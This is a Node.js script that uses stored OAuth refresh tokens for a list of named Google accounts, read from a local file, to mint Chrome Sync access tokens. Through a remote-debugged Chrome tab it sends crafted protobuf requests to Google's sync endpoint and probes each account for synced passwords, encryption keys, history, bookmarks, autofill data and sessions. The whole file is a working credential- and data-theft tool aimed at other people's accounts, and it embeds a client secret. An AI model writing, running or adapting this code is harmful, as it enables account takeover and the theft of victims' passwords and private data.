import { WebSocket } from 'ws';
import fs from 'node:fs';
import http from 'node:http';

const CID='77185425430.apps.googleusercontent.com', SEC='OTJgUOQcT7lO7GsGZq2G4IlT';
const CDP='http://127.0.0.1:9222';
const vint=n=>{const b=[];while(n>0x7f){b.push((n&0x7f)|0x80);n=Math.floor(n/128);}b.push(n);return b;};
const fv=(n,v)=>[...vint(n<<3),...vint(v)];
const fb=(n,buf)=>{const b=typeof buf==='string'?Buffer.from(buf,'utf8'):buf;return[...vint((n<<3)|2),...vint(b.length),...b];};
const fm=(n,inner)=>fb(n,Buffer.from(inner));
function parsePb(buf,endTag=null){const out=[];let off=0;while(off<buf.length){let tag=0,s=0;while(true){const c=buf[off++];tag|=(c&0x7f)<<s;if(!(c&0x80))break;s+=7;}const fn=tag>>3,wt=tag&7;if(wt===4){if(endTag!==null&&tag===endTag)return{fields:out,consumed:off};throw new Error('wg'+fn);}if(wt===0){let v=0,s2=0;while(true){const c=buf[off++];v|=(c&0x7f)<<s2;if(!(c&0x80))break;s2+=7;}out.push([fn,wt,v]);}else if(wt===2){let l=0,s2=0;while(true){const c=buf[off++];l|=(c&0x7f)<<s2;if(!(c&0x80))break;s2+=7;}out.push([fn,wt,buf.subarray(off,off+l)]);off+=l;}else if(wt===3){const r=parsePb(buf.subarray(off),(fn<<3)|4);out.push([fn,wt,r.fields]);off+=r.consumed;}else throw new Error('wt'+wt);}return{fields:out,consumed:off};}

async function mintToken(rt){
  const r=await fetch('https://oauth2.googleapis.com/token',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({grant_type:'refresh_token',client_id:CID,client_secret:SEC,refresh_token:rt,scope:'https://www.googleapis.com/auth/chromesync'})}).then(r=>r.json());
  if(r.error)throw new Error(r.error); return r.access_token;
}

// get page
const pageData=await new Promise((res,rej)=>{const req=http.request(`${CDP}/json/new?about:blank`,{method:'PUT'},r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>res(d));});req.on('error',rej);req.end();});
const page=JSON.parse(pageData);
const ws=new WebSocket(page.webSocketDebuggerUrl);
await new Promise((r,rej)=>{ws.onopen=r;ws.onerror=rej;});
let wk=0;const pend=new Map();
ws.onmessage=ev=>{const m=JSON.parse(ev.data);if(m.id&&pend.has(m.id)){pend.get(m.id)(m);pend.delete(m.id);}};
const send=(method,params={})=>new Promise(res=>{const id=++wk;const t=setTimeout(()=>{pend.delete(id);res({});},20000);pend.set(id,r=>{clearTimeout(t);res(r);});ws.send(JSON.stringify({id,method,params}));});
await send('Runtime.enable');await send('Page.enable');
await send('Page.navigate',{url:'https://clients4.google.com'});await new Promise(r=>setTimeout(r,6000));

const ALL=JSON.parse(fs.readFileSync('/tmp/fatetraffic_alive.json','utf8'));
// test: ft-vahan (active, Drive data) + all BD accounts
const targets=[
  {name:'ft-vahan',acct:ALL[0]},
  {name:'bd-varienlexor',acct:ALL.find(a=>a.email?.includes('varienlexor'))},
  {name:'bd-benoskar',acct:ALL.find(a=>a.email?.includes('benoskar'))},
  {name:'bd-hkofficial',acct:ALL.find(a=>a.email?.includes('hkofficial'))},
  {name:'bd-imnoob',acct:ALL.find(a=>a.email?.includes('imnoob908'))},
  {name:'bd-theomilan',acct:ALL.find(a=>a.email?.includes('theomilan'))},
];

const HIGH=[32904,45873,47745,963985,154522]; // Bookmarks, Passwords, Nigori, History, DeviceInfo
const ALT=[63951,37702,50119]; // AutofillProfile, Preferences, Sessions

for(const t of targets){
  if(!t.acct||!t.acct.refresh_token){console.log(`${t.name}: SKIP no token`);continue;}
  console.log(`\n=== ${t.name} | ${t.acct.email} ===`);
  let at;
  try{at=await mintToken(t.acct.refresh_token);}catch(e){console.log(`  SKIP: ${e.message}`);continue;}
  // step1: get birthday
  const caller=[...fv(2,1)];
  const gu0=[...fm(1,caller),...fv(2,1),...fv(8,1),...fv(4,12)];
  const r0=Buffer.from([...fb(1,t.acct.email),...fv(2,99),...fv(3,2),...fm(5,gu0)]);
  let bday='';
  {
    const b64=r0.toString('base64');
    const ev=await send('Runtime.evaluate',{expression:`(async()=>{const b=Uint8Array.from(atob('${b64}'),c=>c.charCodeAt(0));const r=await fetch('/chrome-sync/command',{method:'POST',headers:{'Content-Type':'application/octet-stream','Authorization':'Bearer ${at}'},body:b});const a=await r.arrayBuffer();return JSON.stringify({s:r.status,b:Array.from(new Uint8Array(a))});})()`,awaitPromise:true,returnByValue:true});
    const v=ev?.result?.result?.value;
    if(v){const p=JSON.parse(v);if(p.s===200){const top=parsePb(Buffer.from(p.b)).fields;bday=top.find(f=>f[0]===6)?.[2]?.toString('utf8')||'';console.log(`  birthday: ${bday?.slice(0,30)}...`);}}
  }
  // probe high-value types
  let found=false;
  for(const typeId of [...HIGH,...ALT]){
    const marker=fm(3,[...fv(1,typeId)]); // no token
    let gu=[...fm(1,caller),...fv(2,1),marker,...fv(8,1),...fv(4,12)];
    if(bday) gu.push(...fb(3,bday));
    const req=Buffer.from([...fb(1,t.acct.email),...fv(2,99),...fv(3,2),...fm(5,gu)]);
    const b64=req.toString('base64');
    const ev=await send('Runtime.evaluate',{expression:`(async()=>{const b=Uint8Array.from(atob('${b64}'),c=>c.charCodeAt(0));const r=await fetch('/chrome-sync/command',{method:'POST',headers:{'Content-Type':'application/octet-stream','Authorization':'Bearer ${at}'},body:b});const a=await r.arrayBuffer();return JSON.stringify({s:r.status,b:Array.from(new Uint8Array(a)),l:a.byteLength});})()`,awaitPromise:true,returnByValue:true});
    const v=ev?.result?.result?.value;
    if(!v){console.log(`  t${typeId}: no-result`);continue;}
    const p=JSON.parse(v);
    if(p.e){console.log(`  t${typeId}: err ${p.e}`);continue;}
    if(p.s!==200){console.log(`  t${typeId}: HTTP${p.s} (${p.l}B)`);continue;}
    const raw=Buffer.from(p.b);
    const top=parsePb(raw).fields;
    const guBytes=top.find(f=>f[0]===2)?.[2];
    const guf=guBytes?parsePb(guBytes).fields:[];
    const entries=guf.filter(f=>f[0]===1);
    const mkrs=guf.filter(f=>f[0]===5);
    if(entries.length>0){console.log(`  t${typeId}: ${entries.length} entries (${p.l}B)`);found=true;}
    else if(mkrs.length>0){console.log(`  t${typeId}: ${mkrs.length} markers, 0 entries`);}
  }
  if(!found) console.log('  → no sync entries found');
}

ws.close();
